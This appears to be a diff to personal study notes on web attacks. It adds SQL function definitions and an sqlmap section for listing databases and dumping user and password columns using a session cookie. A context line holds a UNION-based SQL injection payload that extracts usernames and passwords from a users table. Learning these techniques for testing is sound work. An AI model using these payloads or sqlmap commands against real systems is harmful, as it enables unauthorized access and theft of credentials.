@@ -28,7 +28,8 @@ SQL INJECTION
 SQL operators and functions:
 
 `UNION` - used to combine the result of two or more SELECT statements with same number of columns and similar data types (selects only distinct values by default - to allow duplicate values, use UNION ALL).  
-`SUBSTRING(str, pos, len)` - returns a specified number of characters from a particular position of a given string.  
+`SUBSTRING(str, pos, len)` - returns a specified number of characters from a particular position of a given string. str=string; pos=starting position; len=length in characters.
+`VERSION()` - returns a string that indicates the MySQL server version.
 
 MySQL delimiter: `#`
 SQL delimiter: `--`
@@ -106,6 +107,17 @@ etc.
 * Display all the columns field contents in the database user table:
 
 `%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #`
+
+SQLMAP
+------
+
+`sqlmap -u "URL" --cookie="COOKIE"`
+
+--dbs: list databases
+-D [database]: specify a databases
+--tables: list tables
+-T users: list columns of users table
+-C user, password --dump
 
 
 COMMAND INJECTION
